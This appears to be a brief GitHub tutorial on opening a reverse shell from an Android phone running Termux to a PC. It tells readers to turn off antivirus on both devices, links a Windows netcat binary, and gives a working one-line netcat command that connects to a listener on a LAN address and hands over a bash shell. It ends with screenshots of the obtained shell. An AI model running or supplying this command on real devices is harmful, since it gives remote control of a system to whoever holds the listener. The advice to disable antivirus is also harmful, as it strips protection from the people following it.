=========================================
📱🔒 Termux Reverse Shell Tutorial 2025 🔑
=========================================

### ⚙️ Steps to follow:

1️⃣ **Turn off Antivirus** (on PC and phone)  
2️⃣ **Install required packages in Termux:** `nano`, `which`, `nc`, etc.  
3️⃣ **Install Netcat (NC) on your PC**

🔽 **Download Netcat for Windows:**  
🔗 https://github.com/diegocr/netcat/blob/master/nc.exe

🖥️ **PC Screenshot:**  
![PC Screenshot](https://github.com/user-attachments/assets/0e478801-485a-4bef-80fe-c063411f6493)

📱 **Phone Screenshot:**  
![Phone Screenshot](https://github.com/user-attachments/assets/594827ce-91ca-4867-9c88-a112ea16dfa6)

### 💻 Command used in Termux:

```bash
nc 192.168.100.168 4444 -e /data/data/com.termux/files/usr/bin/bash
```

📝 *Replace the path above with your actual Termux bash path if different.*

---

### 🧠 Note:
> This is the **simplest way** to demonstrate a reverse shell on an Android phone using Termux.

🔁 **Reverse shell obtained:**  
![Reverse shell](https://github.com/user-attachments/assets/fc387a56-0d8c-4b98-9e4d-c87622d45b73)
